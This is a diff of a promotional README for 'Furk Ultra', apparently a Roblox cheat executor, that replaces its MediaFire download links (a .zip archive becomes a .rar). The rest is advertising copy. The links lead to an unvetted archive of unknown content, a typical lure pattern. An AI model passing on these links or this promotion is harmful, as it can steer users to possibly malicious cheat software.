@@ -4,8 +4,8 @@
 
 ## Furk Ultra for Roblox
 
-[![Download Furk Ultra](https://github.com/furk-ultra/furk-ultra.github.io/blob/main/furk-ultra-showcase.jpg?raw=true)](https://www.mediafire.com/file/k77tbztynp834k6/Furk.Ultra.zip/file)
-[![Download Furk Ultra](https://github.com/furk-ultra/furk-ultra.github.io/blob/main/button.png?raw=true)](https://www.mediafire.com/file/k77tbztynp834k6/Furk.Ultra.zip/file)
+[![Download Furk Ultra](https://github.com/furk-ultra/furk-ultra.github.io/blob/main/furk-ultra-showcase.jpg?raw=true)](https://www.mediafire.com/file/ph6cdriajn3itto/Furk.Ultra.rar/file)
+[![Download Furk Ultra](https://github.com/furk-ultra/furk-ultra.github.io/blob/main/button.png?raw=true)](https://www.mediafire.com/file/ph6cdriajn3itto/Furk.Ultra.rar/file)
 
 Are you looking for a powerful tool to enhance your Roblox gaming experience? Look no further than Furk Ultra - a Roblox executor that has become a popular choice among gamers. In this article, we will explore the features and benefits of Furk Ultra, and why it has become so popular in the gaming community.
 
